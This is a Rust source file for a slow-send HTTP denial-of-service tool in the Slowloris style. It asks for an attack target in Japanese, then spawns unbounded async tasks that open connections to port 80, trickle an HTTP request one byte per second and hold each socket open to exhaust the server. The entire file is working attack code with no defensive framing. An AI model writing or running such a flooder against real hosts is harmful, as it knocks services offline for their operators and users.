#[macro_use]
extern crate lazy_static;
extern crate tokio;

use std::{io::Write, time::Duration};

use tokio::{
    io::{AsyncReadExt, AsyncWriteExt, BufStream},
    sync::RwLock,
    time::{sleep, Instant},
};

struct Session {
    http_request: Vec<u8>,
    connect: String,
    errors: RwLock<u8>,
}

impl Session {
    fn new() -> Session {
        Session {
            http_request: b"GET / HTTP/1.1\r\nConnection: keep-alive\r\n".to_vec(),
            connect: String::new(),
            errors: RwLock::const_new(0),
        }
    }
}

lazy_static! {
    static ref SESSION: RwLock<Session> = RwLock::const_new(Session::new());
}

#[tokio::main]
async fn main() {
    print!("攻撃先: ");
    std::io::stdout().flush().unwrap();
    let mut connect = String::new();
    std::io::stdin().read_line(&mut connect).unwrap();
    let mut connect = connect.trim().to_string();
    let mut session = SESSION.write().await;
    session.http_request.extend(b"Host: ");
    session.http_request.extend(connect.as_bytes());
    session.http_request.extend(b"\r\n\r\n");
    connect.push_str(":80");
    session.connect = connect;
    drop(session);

    let session = SESSION.read().await;
    loop {
        let errors = session.errors.read().await;
        if *errors == u8::MAX {
            break;
        }
        drop(errors);

        tokio::spawn(attack());
    }
    loop {
        sleep(Duration::from_secs(1)).await;
        tokio::spawn(attack());
    }
}

async fn attack() {
    let session = SESSION.read().await;
    loop {
        let mut connect = match tokio::net::TcpStream::connect(&session.connect).await {
            Ok(o) => BufStream::new(o),
            Err(_) => {
                let mut errors = session.errors.write().await;
                if *errors < u8::MAX {
                    *errors += 1;
                }
                return;
            }
        };

        for i in 0..session.http_request.len() {
            let _ = connect.write_all(&session.http_request[i..i + 1]).await;
            if connect.flush().await.is_err() {
                break;
            };
            sleep(Duration::from_secs(1)).await;
        }

        let mut buffer = [0_u8];
        loop {
            if connect.read_exact(&mut buffer).await.is_err() {
                break;
            }
        }
    }
}
